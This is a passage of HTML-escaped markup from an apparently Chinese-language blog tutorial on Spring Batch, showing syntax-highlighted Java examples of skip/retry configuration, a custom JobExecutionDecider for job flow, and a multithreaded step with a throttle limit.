&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46558361439188-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;skipLimit&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46558361439188-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;skip&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;UnknownGenderException&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46558361439188-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;skip&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ServiceUnavailableException&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46558361439188-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;retryLimit&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46558361439188-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;retry&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ServiceUnavailableException&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46558361439188-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;backOffPolicy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;backoffPolicy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46558361439188-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;listener&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;logSkipListener&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46558361439188-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46558361439188-18&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0026 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;使用自定义的Decider来实现Job flow&lt;/h3&gt;
&lt;p&gt;在Job执行过程中不一定都是顺序执行的，我们经常需要根据某个job的输出数据或执行结果来决定下一步的走向。以前我们会把一些判断放置在下游step中进行，这样可能会导致有些step实际运行了，但其实并没有做任何事情。比如一个step执行过程中会将失败的数据条目记录到一个报告中，而下一个step会判断有没有生成报告，如果生成了报告则将该报告发送给指定联系人，如果没有则不做任何事情。这种情况下可以通过Decider机制来实现Job的执行流程。在Spring batch 3.0中Decider已经从Step中独立出来，和Step处于同一级别。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a4655c903257119&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
public class ReportDecider implements JobExecutionDecider {
    @Override
    public FlowExecutionStatus decide(JobExecution jobExecution, StepExecution stepExecution) {
        if (report.isExist()) {
            return new FlowExecutionStatus(“SEND&quot;);
        }

        return new FlowExecutionStatus(“SKIP&quot;);
    }
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4655c903257119-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4655c903257119-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4655c903257119-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4655c903257119-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4655c903257119-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4655c903257119-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4655c903257119-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4655c903257119-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a4655c903257119-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a4655c903257119-10&quot;&gt;10&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4655c903257119-1&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;ReportDecider&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;implements&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;JobExecutionDecider&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4655c903257119-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Override&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4655c903257119-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;FlowExecutionStatus &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;decide&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;JobExecution &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;jobExecution&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;StepExecution &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stepExecution&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4655c903257119-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;isExist&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4655c903257119-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;FlowExecutionStatus&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;“&lt;span class=&quot;crayon-i&quot;&gt;SEND&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;);&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4655c903257119-6&quot;&gt;&lt;span class=&quot;crayon-s&quot;&gt;        }&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4655c903257119-7&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4655c903257119-8&quot;&gt;
&lt;span class=&quot;crayon-s&quot;&gt;        return new FlowExecutionStatus(“SKIP&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a4655c903257119-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a4655c903257119-10&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0013 seconds] --&gt;
&lt;p&gt;而在job配置中可以这样来使用Decider。这样整个Job的执行流程会更加清晰易懂。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a46561644919379&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
public Job job() {
    return new JobBuilder(&quot;petstore&quot;)
        .start(orderProcess())
        .next(reportDecider)
        .on(&quot;SEND&quot;).to(sendReportStep)
        .on(&quot;SKIP&quot;).end().build()
        .build();
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46561644919379-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46561644919379-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46561644919379-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46561644919379-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46561644919379-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46561644919379-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b100a46561644919379-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b100a46561644919379-8&quot;&gt;8&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46561644919379-1&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Job &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;job&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46561644919379-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;JobBuilder&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;petstore&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46561644919379-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;orderProcess&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46561644919379-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;reportDecider&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46561644919379-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;SEND&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sendReportStep&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46561644919379-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;SKIP&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b100a46561644919379-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b100a46561644919379-8&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0013 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;采用多种机制加速Job的执行&lt;/h3&gt;
&lt;p&gt;批处理工作处理的数据量大，而执行窗口一般又要求比较小。所以必须要通过多种方式来加速Job的执行。一般我们有四种方式来实现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在单个step中多线程执行任务&lt;/li&gt;
&lt;li&gt;并行执行不同的Step&lt;/li&gt;
&lt;li&gt;并行执行同一个Step&lt;/li&gt;
&lt;li&gt;远程执行Chunk任务&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;单个step多线程执行任务可以借助于taskExecutor来实现。这种情况适合于reader、writer是线程安全且是无状态的场景。我们还可以设置线程数量。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b100a46565504336525&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
public Step step() {
    return stepBuilders.get(&quot;step&quot;)
        .tasklet(tasklet)
        .throttleLimit(20)
        .build();
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
